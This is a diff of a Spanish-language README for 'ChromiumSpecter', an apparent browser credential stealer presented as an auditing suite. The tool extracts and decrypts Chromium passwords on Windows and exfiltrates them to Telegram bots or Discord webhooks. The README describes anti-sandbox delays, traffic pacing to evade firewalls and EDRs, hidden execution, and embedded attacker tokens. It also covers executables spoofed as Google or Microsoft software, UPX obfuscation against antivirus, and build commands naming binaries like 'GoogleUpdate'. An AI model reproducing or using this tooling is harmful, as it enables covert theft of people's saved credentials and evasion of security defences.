@@ -1,4 +1,4 @@
-# 🛡️ Chromium Credentials Auditor Suite
+# 🛡️ ChromiumSpecter Auditor Suite
 
 > [!NOTE]
 > [English Version](README.en.md) | **Versión en Español**
@@ -11,7 +11,7 @@
 ![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)
 ![Discord](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)
 
-*Una suite avanzada para auditorías de seguridad profesional y pentesting ético en entornos Windows.*
+*La suite definitiva de grado táctico para auditorías de seguridad en navegadores Chromium.*
 
 [Reportar Bug](https://github.com/ANONIMO432HZ/decrypt-chromium-suite/issues) | [Solicitar Mejora](https://github.com/ANONIMO432HZ/decrypt-chromium-suite/issues)
 
@@ -19,168 +19,89 @@
 
 ---
 
-## 💻 Compatibilidad del Sistema
+## 💻 Resumen de Capacidades
 
-| Sistema Operativo | Versiones Soportadas | Arquitectura |
+**ChromiumSpecter** es una suite de auditoría de credenciales diseñada para entornos Windows, enfocada en la discreción, la automatización y la ergonomía operativa. Permite extraer, descifrar y exfiltrar datos de navegadores basados en Chromium (v80+) con una arquitectura modular y resiliente.
+
+### 🌟 Características Destacadas
+
+*   **🖥️ Dashboard de Alta Densidad**: Interfaz gráfica profesional con consolas en tiempo real, estadísticas dinámicas y gestión de resultados mediante pools de widgets optimizados.
+*   **🕵️ Motor de Sigilo (Tactical Stealth)**:
+    *   **Startup Delay**: Selector de retraso inicial (0-300s) para evadir análisis en Sandbox y Sandbox inteligentes.
+    *   **Inter-file Delay (`send_delay`)**: Pausas personalizables entre envíos para prevenir picos de tráfico que alerten a firewalls o EDRs.
+    *   **Startup Hidden**: Opción para ejecutar el binario sin consola y de forma totalmente invisible.
+*   **🚀 Exfiltración Inteligente**:
+    *   **Auto-Exfiltración**: Configuración para envío automático inmediato tras la auditoría.
+    *   **Multi-Canal**: Soporte nativo para **Telegram Bots** y **Discord Webhooks** con redundancia.
+    *   **Persistencia Local**: Guardado seguro de configuraciones de exfiltración para uso recurrente.
+*   **🛠️ Builder Visual Integrado**:
+    *   Generación de stubs personalizados con **Inyección Dinámica** de parámetros.
+    *   **Spoofing de Metadatos**: Presets integrados (Google, Microsoft, Intel) para clonar firmas de ejecutables legítimos.
+    *   **Compresión y Ofuscación**: Soporte nativo para UPX y capas de ofuscación híbrida.
+
+---
+
+## 🚀 Flujo de Trabajo Táctico
+
+1.  **Configuración**: Define tus tokens de Telegram/Discord en el Tab de **Exfiltración** y guárdalos.
+2.  **Auditoría**: Lanza el escaneo desde el Dashboard. Puedes activar la **Auto-exfiltración** para automatizar el ciclo completo.
+3.  **Inspección**: Visualiza las credenciales descifradas en tiempo real en el Tab de **Resultados**.
+4.  **Despliegue**: Usa el **Builder** para generar un `.exe` con tus credenciales embebidas (Base64) y presets de sigilo configurados.
+
+---
+
+## ⚙️ Parámetros de Compilación (Stub)
+
+Al usar el **Builder**, puedes inyectar los siguientes comportamientos en tu binario final:
+
+| Parámetro | Rango / Opción | Propósito |
 | :--- | :--- | :--- |
-| 🪟 **Windows** | Windows 10 / Windows 11 | x64 / x86 |
-| 🌐 **Chromium** | v80 o superior (AES-GCM) | Todas |
-
----
-
-## ✨ Navegadores Soportados
-
-La suite escanea y descifra automáticamente los siguientes objetivos:
-
-* 🌐 **Google Chrome** (Canary, Beta, Stable)
-* 🌐 **Microsoft Edge**
-* 🦁 **Brave Browser**
-* ⭕ **Opera & Opera GX**
-* 📐 **Vivaldi**
-
----
-
-## 🚀 Características Premium
-
-* **📡 Exfiltración Modular**:
-  * Envío instantáneo de reportes vía **Bot de Telegram** o **Webhooks de Discord**.
-* **📊 Reportes Dinámicos**:
-  * Generación de informes estéticos en **HTML Interactivo** o archivos **CSV**.
-  * **Metadata Enriquecida**: Hostname, Usuario, PID y Versión incluidos en cada reporte.
-  * **Sección de Filtrados**: Identificación y visualización separada de credenciales no-HTTP (protocolos locales, extensiones, etc.).
-* **🕵️ Arquitectura de Sigilo (Stealth)**:
-  * Limpieza automática de bases de datos temporales y **Auto-Wipe** del reporte local tras exfiltración.
-  * **Resiliencia de Red**: Sistema de reintentos automático para asegurar la exfiltración ante micro-cortes.
+| **Delay Inicial** | 0s - 300s | Retraso antes de la primera acción (Anti-Sandbox). |
+| **Send Delay** | 0s - 10s | Pausa entre archivos enviados (Evasión de tráfico). |
+| **Webhook Timeout**| 5s - 60s | Tiempo de espera para conexiones inestables. |
+| **Auto-Exfiltrate**| Checkbox | Activa el envío automático sin intervención. |
+| **UAC Prompt** | Toggle | Solicita privilegios de administrador si es necesario. |
 
 ---
 
 ## 🛠️ Stack Tecnológico
 
-| Componente | Tecnología Utilizada |
+| Componente | Tecnología |
 | :--- | :--- |
-| **Lenguaje** | `Python 3.x` |
-| **Seguridad de OS** | `Windows DPAPI` via `PyWin32` |
+| **Core UI** | `CustomTkinter` (Modern Dark Theme) |
 | **Criptografía** | `AES-GCM 256` via `PyCryptodomex` |
-| **Comunicación** | `Telegram API` & `Discord Webhooks` |
-| **Packaging** | `PyInstaller` (Standalone EXE) |
+| **Seguridad OS** | `Windows DPAPI` / `Win32 API` |
+| **Compilación** | `PyInstaller` + `UPX` |
+| **Persistencia** | `JSON` Local (.audit/exfil_config.json) |
 
 ---
 
-## ⚙️ Guía de Uso Rápido
-
-### 1. Instalación de Dependencias
+## ⚙️ Guía de Instalación
 
 ```bash
+# 1. Clonar el repositorio
+git clone https://github.com/ANONIMO432HZ/decrypt-chromium-suite.git
+cd decrypt-chromium-suite
+
+# 2. Instalar dependencias
 pip install -r requirements.txt
+
+# 3. Lanzar el Dashboard
+python gui_app.py
 ```
-
-### 2. Comandos Magistrales
-
-> **Generar Reporte HTML Estético:**
-
-```bash
-python main.py -f html -o reporte_final
-```
-
-> **Exfiltración vía Telegram (Modo Rápido):**
-
-```bash
-python main.py -t "TOKEN" -c "ID" # Soporta Texto Plano o Base64
-```
-
-### 🔑 Uso Autónomo (Hardcoding)
-
-Puedes pre-configurar el script editando la sección `CREDENCIALES HARDCODED` en `main.py` (Se recomienda usar **Base64** para mayor sigilo). Una vez rellenadas, puedes ejecutar el `.exe` o el script sin parámetros y los datos se enviarán automáticamente.
-
----
-
-## 📦 Compilación Profesional y Ofuscación
-
-Para generar un ejecutable robusto, sigiloso y (opcionalmente) ofuscado, utiliza el script **`build.py`** incluido. Este script automatiza la configuración de PyInstaller y PyArmor.
-
-```bash
-# Uso recomendado: un solo archivo, sin consola y con nombre personalizado
-python build.py --name "SysHealth" --onefile --noconsole
-
-# Compilación rápida con presets (google, microsoft, intel)
-python build.py --name "WinService" --preset microsoft --icon "app.ico"
-
-# Spoofing manual avanzado
-python build.py --name "GoogleUpdate" --company "Google LLC" --desc "Google Update Setup"
-
-# Para una compilación rápida sin ofuscación (solo PyInstaller)
-python build.py --no-obf --name "ChromiumAuditor"
-```
-
-> [!TIP]
-> Puedes ver todas las opciones de personalización (iconos, carpetas de salida, etc.) ejecutando `python build.py --help`.
-
-### 🛡️ Endurecimiento y Ofuscación
-Para proteger el binario contra ingeniería inversa y antivirus, consulta la [Guía de Ofuscación Híbrida](docs/OBFUSCATION_GUIDE.md).
-
-### ⚙️ Guía de Compilación Avanzada
-Para obtener instrucciones detalladas sobre flujos híbridos (Windows + WSL) o puros (Linux con Wine), consulta la [Guía de Flujos de Compilación](docs/COMPILATION_FLOWS.md).
-
-## 🚦 Panel de Argumentos CLI
-
-| Corto | Largo | Descripción |
-| :--- | :--- | :--- |
-| `-f` | `--format` | Formato: `html` o `csv`. |
-| `-o` | `--output` | Nombre base del archivo de salida. |
-| **`-t`** | `--telegram-token` | Token del bot de Telegram (Plano o B64). |
-| **`-c`** | `--telegram-chatid` | ID del chat de Telegram (Plano o B64). |
-| **`-d`** | `--discord` | URL del Webhook de Discord (Plano o B64). |
-| `-s` | `--stealth` | Oculta la consola en tiempo real (idéntico a `.exe --noconsole`). |
-| — | `--no-wipe` | Evita auto-borrado del reporte local tras envío. |
-| — | `--clean` | Elimina todos los reportes acumulados (`.html`, `.csv`) en la carpeta de salida. |
-| `-v` | `--verbose` | Modo verboso (logs detallados de depuración). |
 
 ---
 
 ## 📡 Configuración de Exfiltración
 
 ### 🤖 Telegram
-
-Necesitas dos valores: el **Token del Bot** y el **ID del Destino**.
-
-**Token del Bot** — Obténlo hablando con `@BotFather` en Telegram:
-
-```text
-1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ
-```
-
-**ID del Destino** — El campo `-c` / `HARDCODED_TG_ID` acepta tres tipos:
-
-| Tipo de Destino | Formato del ID | Cómo Obtenerlo |
-| :--- | :--- | :--- |
-| 💬 **Chat Personal** | Número positivo `987654321` | Habla con `@userinfobot` |
-| 👥 **Grupo Privado** | Número negativo `-1001234567890` | Añade `@RawDataBot` al grupo |
-| 📢 **Canal Privado** | Número negativo `-1001234567890` | Añade el bot al canal como admin |
-
-> [!IMPORTANT]
-> Para **grupos y canales**, añade tu bot como miembro con permisos de **"Enviar Archivos"** antes de usarlo.
-> Para **chats personales**, envía primero un mensaje a tu bot para iniciar la conversación.
+Requiere **Token** y **Chat ID**.
+*   Obtén el token con `@BotFather`.
+*   Obtén tu ID con `@userinfobot`.
 
 ### 🎮 Discord
-
-Obten la URL del Webhook en: **Canal → Editar Canal → Integraciones → Webhooks → Crear Webhook**
-
-```text
-https://discord.com/api/webhooks/1234567890/TOKEN_SECRETO_AQUI
-```
-
-Pega esa URL completa en `-d` / `HARDCODED_DS_WEBHOOK`.
-
-### 🔒 Recomendación de Seguridad Operacional
-
-Para máxima discrección y trazabilidad cero:
-
-1. Crea un **canal privado exclusivo** para cada auditoría.
-2. Añade el bot como único administrador del canal.
-3. Usa el ID del canal como `HARDCODED_TG_ID`.
-4. **Elimina el canal y el bot** al finalizar la auditoría.
-
-Así, si el token fuera comprometido, el atacante solo accedería a un canal vacío y eliminado.
+Requiere **Webhook URL**.
+*   Configúralo en: Ajustes del Canal -> Integraciones -> Webhooks.
 
 ---
 
